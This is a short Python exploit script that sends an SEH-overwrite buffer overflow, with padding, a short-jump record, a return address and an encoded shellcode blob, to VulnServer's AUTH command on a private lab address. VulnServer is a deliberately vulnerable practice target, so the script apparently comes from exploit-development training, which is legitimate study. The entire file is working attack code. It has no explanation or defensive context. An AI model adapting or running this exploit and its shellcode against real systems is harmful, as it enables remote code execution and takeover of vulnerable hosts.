#! /usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buf1 = 1024 * 'A'
nextseh = '\xeb\x08\x90\x90' # short jump 8 bytes
seh = '\x9b\x2f\xd1\x65' # add esp, 8 / ret
shellcode =  ""
shellcode += "\x4b\x4a\x99\x90\xd6\x92\x27\xf9\x42\xf9\x41\x49"
shellcode += "\x4a\x2f\x49\x9b\x27\x2f\x37\xfd\xda\xd8\xbb\xc2"
shellcode += "\xd1\x2f\xe5\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x47"
shellcode += "\x31\x5a\x18\x83\xea\xfc\x03\x5a\xd6\x33\xda\x19"
shellcode += "\x3e\x31\x25\xe2\xbe\x56\xaf\x07\x8f\x56\xcb\x4c"
shellcode += "\xbf\x66\x9f\x01\x33\x0c\xcd\xb1\xc0\x60\xda\xb6"
shellcode += "\x61\xce\x3c\xf8\x72\x63\x7c\x9b\xf0\x7e\x51\x7b"
shellcode += "\xc9\xb0\xa4\x7a\x0e\xac\x45\x2e\xc7\xba\xf8\xdf"
shellcode += "\x6c\xf6\xc0\x54\x3e\x16\x41\x88\xf6\x19\x60\x1f"
shellcode += "\x8d\x43\xa2\xa1\x42\xf8\xeb\xb9\x87\xc5\xa2\x32"
shellcode += "\x73\xb1\x34\x93\x4a\x3a\x9a\xda\x63\xc9\xe2\x1b"
shellcode += "\x43\x32\x91\x55\xb0\xcf\xa2\xa1\xcb\x0b\x26\x32"
shellcode += "\x6b\xdf\x90\x9e\x8a\x0c\x46\x54\x80\xf9\x0c\x32"
shellcode += "\x84\xfc\xc1\x48\xb0\x75\xe4\x9e\x31\xcd\xc3\x3a"
shellcode += "\x1a\x95\x6a\x1a\xc6\x78\x92\x7c\xa9\x25\x36\xf6"
shellcode += "\x47\x31\x4b\x55\x0f\xf6\x66\x66\xcf\x90\xf1\x15"
shellcode += "\xfd\x3f\xaa\xb1\x4d\xb7\x74\x45\xb2\xe2\xc1\xd9"
shellcode += "\x4d\x0d\x32\xf3\x89\x59\x62\x6b\x38\xe2\xe9\x6b"
shellcode += "\xc5\x37\x87\x6e\x51\xb2\x53\x71\x86\xaa\x61\x71"
shellcode += "\xd9\x76\xef\x97\x89\xd6\xbf\x07\x69\x87\x7f\xf8"
shellcode += "\x01\xcd\x8f\x27\x31\xee\x45\x40\xdb\x01\x30\x38"
shellcode += "\x73\xbb\x19\xb2\xe2\x44\xb4\xbe\x24\xce\x3b\x3e"
shellcode += "\xea\x27\x31\x2c\x9a\xc7\x0c\x0e\x0c\xd7\xba\x25"
shellcode += "\xb0\x4d\x41\xec\xe7\xf9\x4b\xc9\xcf\xa5\xb4\x3c"
shellcode += "\x44\x6f\x21\xff\x32\x90\xa5\xff\xc2\xc6\xaf\xff"
shellcode += "\xaa\xbe\x8b\x53\xcf\xc0\x01\xc0\x5c\x55\xaa\xb1"
shellcode += "\x31\xfe\xc2\x3f\x6c\xc8\x4c\xbf\x5b\xc8\xb1\x16"
shellcode += "\xa5\xbe\xdb\xaa"
buf2 = 1000 * 'B'

print('[*] Connecting to VulnServer...')
s.connect(('10.11.8.182', 5555))
print(s.recv(1024))

print('[*] Sending buffer...')
s.send('AUTH ' + buf1 + nextseh + seh + shellcode + buf2)

s.close()
